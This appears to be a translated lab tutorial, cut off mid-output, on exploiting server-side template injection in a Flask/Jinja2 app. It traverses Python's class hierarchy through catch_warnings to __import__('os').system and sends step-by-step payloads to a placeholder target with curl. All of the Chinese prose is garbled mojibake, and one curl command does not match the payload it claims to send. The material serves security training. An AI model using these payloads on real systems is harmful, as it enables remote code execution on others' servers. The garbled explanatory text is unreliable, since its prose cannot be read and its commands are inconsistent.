<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> flask</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">'HTB'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(s)</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.__class__</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(s)</span><br><span class="line"></span><br><span class="line">[<span class="string">'__add__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__getnewargs__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__mod__'</span>, <span class="string">'__mul__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__rmod__'</span>, <span class="string">'__rmul__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'capitalize'</span>, <span class="string">'casefold'</span>, <span class="string">'center'</span>, <span class="string">'count'</span>, <span class="string">'encode'</span>, <span class="string">'endswith'</span>, <span class="string">'expandtabs'</span>, <span class="string">'find'</span>, <span class="string">'format'</span>, <span class="string">'format_map'</span>, <span class="string">'index'</span>, <span class="string">'isalnum'</span>, <span class="string">'isalpha'</span>, <span class="string">'isascii'</span>, <span class="string">'isdecimal'</span>, <span class="string">'isdigit'</span>, <span class="string">'isidentifier'</span>, <span class="string">'islower'</span>, <span class="string">'isnumeric'</span>, <span class="string">'isprintable'</span>, <span class="string">'isspace'</span>, <span class="string">'istitle'</span>, <span class="string">'isupper'</span>, <span class="string">'join'</span>, <span class="string">'ljust'</span>, <span class="string">'lower'</span>, <span class="string">'lstrip'</span>, <span class="string">'maketrans'</span>, <span class="string">'partition'</span>, <span class="string">'replace'</span>, <span class="string">'rfind'</span>, <span class="string">'rindex'</span>, <span class="string">'rjust'</span>, <span class="string">'rpartition'</span>, <span class="string">'rsplit'</span>, <span class="string">'rstrip'</span>, <span class="string">'split'</span>, <span class="string">'splitlines'</span>, <span class="string">'startswith'</span>, <span class="string">'strip'</span>, <span class="string">'swapcase'</span>, <span class="string">'title'</span>, <span class="string">'translate'</span>, <span class="string">'upper'</span>, <span class="string">'zfill'</span>]</span><br></pre></td></tr></tbody></table></figure>

<p>ä¸‹ä¸€æ­¥æ˜¯ç†è§£Pythonçš„å±‚æ¬¡ç»“æ„ã€‚ä½¿ç”¨<code>__mro__</code>æˆ–<code>mro()</code>ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨Pythonç¯å¢ƒä¸­è¿”å›ç»§æ‰¿å¯¹è±¡çš„æ ‘ã€‚è®©æˆ‘ä»¬æŒ‰å¦‚ä¸‹æ–¹å¼ç»ƒä¹ ã€‚</p>
<p>Code: s._<em>class</em></p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.__class__.__class__</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'type'</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.__class__.__base__</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'object'</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.__class__.__base__.__subclasses__()</span><br><span class="line"></span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">'type'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakref'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakcallableproxy'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakproxy'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'int'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'bytearray'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'bytes'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'list'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'NoneType'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'NotImplementedType'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'traceback'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'super'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'range'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_keys'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_values'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_items'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reversekeyiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reversevalueiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reverseitemiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'odict_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'set'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'slice'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'staticmethod'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'complex'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'float'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'frozenset'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'property'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'managedbuffer'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'memoryview'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'tuple'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'enumerate'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'reversed'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'stderrprinter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'code'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'frame'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'builtin_function_or_method'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'method'</span>&gt;,</span><br><span class="line"> &lt;SNIP&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.__class__.mro()[<span class="number">1</span>].__subclasses__()</span><br><span class="line"></span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">'type'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakref'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakcallableproxy'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'weakproxy'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'int'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'bytearray'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'bytes'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'list'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'NoneType'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'NotImplementedType'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'traceback'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'super'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'range'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_keys'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_values'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_items'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reversekeyiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reversevalueiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'dict_reverseitemiterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'odict_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'set'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'slice'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'staticmethod'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'complex'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'float'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'frozenset'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'property'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'managedbuffer'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'memoryview'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'tuple'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'enumerate'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'reversed'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'stderrprinter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'code'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'frame'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'builtin_function_or_method'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'method'</span>&gt;,</span><br><span class="line"> &lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬å¯»æ‰¾ä¸€äº›å¯ä»¥ä¿ƒè¿›è¿œç¨‹ä»£ç æ‰§è¡Œçš„æœ‰ç”¨ç±»ã€‚</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = s.__class__.mro()[<span class="number">1</span>].__subclasses__()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):<span class="built_in">print</span>(i, x[i].__name__)</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span> <span class="built_in">type</span></span><br><span class="line"><span class="number">1</span> weakref</span><br><span class="line"><span class="number">2</span> weakcallableproxy</span><br><span class="line"><span class="number">3</span> weakproxy</span><br><span class="line"><span class="number">4</span> <span class="built_in">int</span></span><br><span class="line"><span class="number">5</span> <span class="built_in">bytearray</span></span><br><span class="line"><span class="number">6</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="number">7</span> <span class="built_in">list</span></span><br><span class="line"><span class="number">8</span> NoneType</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">searchfunc</span>(<span class="params">name</span>):</span><br><span class="line"><span class="meta">... </span>    x = s.__class__.mro()[<span class="number">1</span>].__subclasses__()</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line"><span class="meta">... </span>            fn = x[i].__name__</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">if</span> fn.find(name) &gt; -<span class="number">1</span>:</span><br><span class="line"><span class="meta">... </span>                    <span class="built_in">print</span>(i, fn)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>searchfunc(<span class="string">'warning'</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">215</span> catch_warnings</span><br></pre></td></tr></tbody></table></figure>

<p>ä½ å¯èƒ½ä¼šé—®ï¼Œä¸ºä»€ä¹ˆè¦æœç´¢<code>warning</code>ã€‚æˆ‘ä»¬é€‰æ‹©è¿™ä¸ªç±»æ˜¯å› ä¸ºå®ƒå¯¼å…¥äº†Pythonçš„<a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/3.9/Lib/warnings.py#L3">sysæ¨¡å—</a>ï¼Œä»<code>sys</code>å¯ä»¥åˆ°è¾¾<code>os</code>æ¨¡å—ã€‚æ›´å‡†ç¡®åœ°è¯´ï¼Œosæ¨¡å—éƒ½æ¥è‡ª<code>warnings.catch_</code>ã€‚</p>
<p>è¯·æ³¨æ„ï¼Œæ‚¨å¯èƒ½ä¼šé‡åˆ°ä¸åŒçš„å·ç ã€‚å›åˆ°æˆ‘ä»¬çš„Python for SSTIç»†èŠ‚ï¼Œæˆ‘ä»¬å·²ç»çœ‹åˆ°<code>catch_warnings</code>å­˜åœ¨ï¼Œè€Œæ²¡æœ‰å°†ä»»ä½•é¢å¤–çš„æ¨¡å—å¯¼å…¥åˆ°æˆ‘ä»¬çš„Pythonæ§åˆ¶å°ã€‚è®©æˆ‘ä»¬æšä¸¾è¿™ä¸ªç±»çš„å†…ç½®ç¨‹åºï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>y = x[<span class="number">215</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'warnings.catch_warnings'</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y()._module.__builtins__</span><br><span class="line"></span><br><span class="line">{<span class="string">'__name__'</span>: <span class="string">'builtins'</span>, <span class="string">'__doc__'</span>: <span class="string">"Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices."</span>, <span class="string">'__package__'</span>: <span class="string">''</span>, <span class="string">'__loader__'</span>: &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.BuiltinImporter'</span>&gt;, <span class="string">'__spec__'</span>: ModuleSpec(name=<span class="string">'builtins'</span>, loader=&lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.BuiltinImporter'</span>&gt;), <span class="string">'__build_class__'</span>: &lt;built-<span class="keyword">in</span> function __build_class__&gt;, <span class="string">'__import__'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;, <span class="string">'abs'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">abs</span>&gt;, <span class="string">'all'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">all</span>&gt;, <span class="string">'any'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">any</span>&gt;, <span class="string">'ascii'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">ascii</span>&gt;, <span class="string">'bin'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">bin</span>&gt;, <span class="string">'breakpoint'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">breakpoint</span>&gt;, <span class="string">'callable'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">callable</span>&gt;, <span class="string">'chr'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">chr</span>&gt;, <span class="string">'compile'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">compile</span>&gt;, <span class="string">'delattr'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">delattr</span>&gt;, <span class="string">'dir'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">dir</span>&gt;, <span class="string">'divmod'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">divmod</span>&gt;, <span class="string">'eval'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;, <span class="string">'exec'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">exec</span>&gt;, <span class="string">'format'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">format</span>&gt;, <span class="string">'getattr'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">getattr</span>&gt;, <span class="string">'globals'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">globals</span>&gt;,</span><br><span class="line"> &lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>z = y()._module.__builtins__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> z:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> i.find(<span class="string">'import'</span>) &gt;-<span class="number">1</span>:</span><br><span class="line"><span class="meta">... </span>            <span class="built_in">print</span>(i, z[i])</span><br><span class="line">...	</span><br><span class="line"><span class="built_in">__import__</span> &lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>çœ‹èµ·æ¥æˆ‘ä»¬å·²ç»é€šè¿‡éå†å±‚æ¬¡ç»“æ„åˆ°è¾¾äº†å¯¼å…¥åŠŸèƒ½ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åŠ è½½<code>os</code>å¹¶ä½¿ç”¨<code>system</code>å‡½æ•°æ¥æ‰§è¡Œæ‰€æœ‰æ¥è‡ªå­—ç¬¦ä¸²å¯¹è±¡çš„ä»£ç ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br><span class="line"></span><br><span class="line">[<span class="number">215</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'echo RCE from a string object'</span>)</span><br><span class="line">RCE <span class="keyword">from</span> a string <span class="built_in">object</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></tbody></table></figure>

<p>å›åˆ°æˆ‘ä»¬æ˜“å—æ”»å‡»çš„Webåº”ç”¨ç¨‹åºï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•é‡å¤ç›¸åŒçš„è¿‡ç¨‹å¹¶å¼€å‘RCEæœ‰æ•ˆè´Ÿè½½ã€‚è¯·è®°ä½ï¼Œä¸‹é¢çš„æœ‰æ•ˆè½½è·å¯ä»¥é€šè¿‡æµè§ˆå™¨æäº¤ç»™åº”ç”¨ç¨‹åºï¼Œä¹Ÿå¯ä»¥é€šè¿‡URLç¼–ç åçš„cURLæäº¤ç»™åº”ç”¨ç¨‹åºã€‚</p>
<p>Payload:</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{ <span class="string">''</span>.__class__ }}</span><br></pre></td></tr></tbody></table></figure>

<h4 id="Curl-Interacting-with-the-Target-2"><a href="#Curl-Interacting-with-the-Target-2" class="headerlink" title="Curl - Interacting with the Target"></a>Curl - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;&amp;lt;class &amp;#39;str&amp;#39;&amp;gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<h4 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h4><p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{ <span class="string">''</span>.__class__.__mro__ }}</span><br></pre></td></tr></tbody></table></figure>

<h4 id="Curl-Interacting-with-the-Target-3"><a href="#Curl-Interacting-with-the-Target-3" class="headerlink" title="Curl - Interacting with the Target"></a>Curl - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;(&amp;lt;class &amp;#39;str&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;object&amp;#39;&amp;gt;)&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å¯¹ç¬¬äºŒä¸ªé¡¹ç›®æ„Ÿå…´è¶£ï¼Œå› æ­¤æœ‰æ•ˆè½½è·åº”å˜ä¸ºï¼š</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{ <span class="string">''</span>.__class__.__mro__[<span class="number">1</span>] }}      </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;&amp;lt;class &amp;#39;object&amp;#39;&amp;gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;input type="submit" value="execute"&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>è®©æˆ‘ä»¬å¼€å§‹æ²¿ç€å±‚æ¬¡ç»“æ„å¾€ä¸‹èµ°ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">{{ <span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__() }}        </span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%20%7D%7D"</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div id="desktop"&gt;</span><br><span class="line">		&lt;div class="window" data-title="Run"&gt;</span><br><span class="line">			&lt;form action="/execute" method="get"&gt;</span><br><span class="line">				&lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;</span><br><span class="line">				&lt;br/&gt;</span><br><span class="line">				&lt;a&gt;[&amp;lt;class &amp;#39;type&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakref&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakcallableproxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;weakproxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;int&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytearray&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;bytes&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;list&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;NoneType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;NotImplementedType&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;traceback&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;super&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;range&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_keys&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_values&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_items&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_reversekeyiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_reversevalueiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;dict_reverseitemiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;odict_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;set&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;str&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;slice&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;staticmethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;complex&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;float&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;frozenset&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;property&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;managedbuffer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;memoryview&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;tuple&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;enumerate&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;reversed&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;stderrprinter&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;code&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;frame&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;builtin_function_or_method&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;method&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;function&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;mappingproxy&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;generator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;getset_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;wrapper_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;method-wrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;ellipsis&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;member_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;types.SimpleNamespace&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;PyCapsule&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;longrange_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;cell&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;instancemethod&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;classmethod_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;method_descriptor&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;callable_iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;iterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;pickle.PickleBuffer&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;coroutine&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;coroutine_wrapper&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;InterpreterID&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;EncodingMap&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;fieldnameiterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;formatteriterator&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;BaseException&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt_array_node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt_bitmap_node&amp;#39;&amp;gt;, &amp;lt;class &amp;#39;hamt_collision_node&amp;#39;&amp;gt;, 